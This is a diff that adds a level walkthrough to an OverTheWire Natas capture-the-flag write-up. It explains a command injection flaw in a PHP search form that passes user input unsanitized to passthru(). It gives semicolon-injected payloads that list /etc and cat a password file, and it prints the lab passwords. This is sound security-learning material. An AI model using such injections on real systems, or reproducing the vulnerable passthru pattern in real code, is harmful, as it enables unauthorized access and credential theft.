@@ -188,3 +188,43 @@ if(array_key_exists("submit", $_POST)) {
 - undo reverse & base64_decode "==QcCtmMml1ViV3b" > atob(x.split("").reverse().join("")) > "oubWYf2kBq"
 - input secret (oubWYf2kBq) > Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
 ```
+
+## 9->10
+- http://natas9.natas.labs.overthewire.org/
+- `natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`
+- This level exploits command injection vulnerability. The script takes a `needle` parameter, and directly uses it in the `passthru()` function without sanitization. Since there is no input validation, we can inject additional shell commands.
+- `; ls /etc/ #`
+- `; ls /etc/natas_webpass #`
+- `; cat /etc/natas_webpass/natas10 #`
+  - Uses a semicolon (`;`) to terminate the grep command
+  - Runs `cat /etc/natas_webpass/natas10` to display the password file
+  - Uses `#` to comment out the rest of the command
+  - Server executes: `grep -i ; cat /etc/natas_webpass/natas10 # dictionary.txt`
+```html
+...
+<h1>natas9</h1>
+<div id="content">
+<form>
+Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+</form>
+
+Output:
+<pre>
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+?>
+</pre>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+...
+```
